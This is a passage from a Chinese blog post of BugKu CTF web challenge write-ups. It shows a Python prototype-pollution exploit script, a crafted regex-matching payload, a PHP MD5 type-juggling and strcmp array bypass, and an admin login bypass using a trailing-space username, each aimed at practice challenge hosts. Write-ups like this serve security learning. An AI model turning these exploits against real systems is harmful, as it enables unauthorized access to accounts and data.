+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/update&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">challenger</span> === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/reg&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">attrkey</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">attrval</span> === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;传参有误&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.<span class="property">body</span>.<span class="property">attrkey</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">let</span> value = req.<span class="property">body</span>.<span class="property">attrval</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="title function_">setFn</span>(req.<span class="property">session</span>.<span class="property">challenger</span>, key, value);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;修改成功&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>故构造exp如下即可获得flag</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = requests.session()  <span class="comment">#要保持同一会话</span></span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:19460&quot;</span></span><br><span class="line">reg = s.get(url+<span class="string">&#x27;/reg&#x27;</span>)</span><br><span class="line"><span class="comment"># print(reg.text)</span></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">&#x27;attrkey&#x27;</span>:<span class="string">&#x27;age&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;attrval&#x27;</span>:<span class="number">79</span></span><br><span class="line">&#125;</span><br><span class="line">update_age = s.post(url+<span class="string">&#x27;/update&#x27;</span>,data=data)</span><br><span class="line"><span class="comment"># print(update_age.text)</span></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">&#x27;attrkey&#x27;</span>:<span class="string">&#x27;__proto__.pwd&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;attrval&#x27;</span>:<span class="number">123</span></span><br><span class="line">&#125;</span><br><span class="line">update_info = s.post(url+<span class="string">&#x27;/update&#x27;</span>,data=data)</span><br><span class="line"><span class="comment"># print(update_info.text)</span></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">&#x27;password&#x27;</span>:<span class="number">123</span>,</span><br><span class="line">	<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;pwd&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = s.post(url=url+<span class="string">&#x27;/getflag&#x27;</span>,data=data);</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2dbb1b38de1e">BugKu-Web-wp3</a></p>
+</blockquote>
+<h2 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h2><p>打开网页获得源码，本地分析</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// highlight_file(&#x27;2.php&#x27;);</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>] = <span class="string">&#x27;keykeyaaaaakey:/a/keya.&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;flag&#123;********************************&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//  [[:punct:]]代表任何标点符号</span></span><br><span class="line"><span class="variable">$IM</span>= <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]), <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$IM</span> )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;key is: &#x27;</span>.<span class="variable">$key</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Fail!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造payload获取flag</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13051/?id=keykeyaaaaakey:/a/keya.</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>正则匹配规则：<a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-rule.html">正则表达式 - 匹配规则</a></p>
+</blockquote>
+<h2 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h2><p>查看网页源码发现code.txt，访问即可获得源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$v3</span>, <span class="variable">$flag</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11845/?v1=QNKCDZO&amp;v2=s878926199a&amp;v3[]=1</span><br></pre></td></tr></table></figure>
+
+<h2 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h2><p>尝试注册admin用户提示用户名已经存在，故猜测管理员账号用户名为admin</p>
+<p><img src="https://s2.loli.net/2022/04/27/M4C7zaomdrfwk1q.png" alt="login1_1.png"></p>
+<p>经过尝试发现未对空格过滤，故创建一个用户名为<code>‘admin ’</code>（即admin+空格）的账户登录即可</p>
+<p><img src="https://s2.loli.net/2022/04/27/F7qpLaQ3dwZK24T.png" alt="login1_2.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://evolution957.github.io/">Evolution957</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://evolution957.github.io/2022/04/27/BugKu-Web3/">https://evolution957.github.io/2022/04/27/BugKu-Web3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Evolution957.github.io" target="_blank">Evolution957's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/BugKu/">BugKu</a></div><div class="post_share"><div class="social-share" data-image="/img/BugKu_Web3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/04/25/BugKu-Web2/"><img class="next-cover" src="/img/BugKu_Web2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BugKu Web 刷题记录2</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/04/24/BugKu-Web1/" title="BugKu Web 刷题记录1"><img class="cover" src="/img/BugKu_Web1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-24</div><div class="title">BugKu Web 刷题记录1</div></div></a></div><div><a href="/2022/04/25/BugKu-Web2/" title="BugKu Web 刷题记录2"><img class="cover" src="/img/BugKu_Web2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-25</div><div class="title">BugKu Web 刷题记录2</div></div></a></div><div><a href="/2022/04/21/pikachu/" title="pikachu靶场刷题记录"><img class="cover" src="/img/pikachu.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-21</div><div class="title">pikachu靶场刷题记录</div></div></a></div><div><a href="/2022/04/20/2022StarCTF-Misc-babyFL/" title="2022StarCTF-Misc-babyFL"><img class="cover" src="/img/babyFL.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-20</div><div class="title">2022StarCTF-Misc-babyFL</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BugKu-Web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953"><span class="toc-number">1.</span> <span class="toc-text">BugKu Web 刷题记录3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#game1"><span class="toc-number">1.1.</span> <span class="toc-text">game1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval"><span class="toc-number">1.2.</span> <span class="toc-text">eval</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">1.2.1.</span> <span class="toc-text">方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">1.2.2.</span> <span class="toc-text">方法2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#source"><span class="toc-number">1.3.</span> <span class="toc-text">source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.4.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952-1"><span class="toc-number">1.4.2.</span> <span class="toc-text">方法2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81"><span class="toc-number">1.5.</span> <span class="toc-text">好像需要密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-one-knows-regex-better-than-me"><span class="toc-number">1.6.</span> <span class="toc-text">No one knows regex better than me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell"><span class="toc-number">1.7.</span> <span class="toc-text">shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%AA%E6%98%8E%E7%9A%84php"><span class="toc-number">1.8.</span> <span class="toc-text">聪明的php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA"><span class="toc-number">1.9.</span> <span class="toc-text">xxx二手交易市场</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD"><span class="toc-number">1.10.</span> <span class="toc-text">闪电十六鞭</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sodirty"><span class="toc-number">1.11.</span> <span class="toc-text">sodirty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F"><span class="toc-number">1.12.</span> <span class="toc-text">字符？正则？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%A5%B3%E5%8F%8B"><span class="toc-number">1.13.</span> <span class="toc-text">前女友</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login1"><span class="toc-number">1.14.</span> <span class="toc-text">login1</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By Evolution957</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">岂能尽如人意，但求无愧我心</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
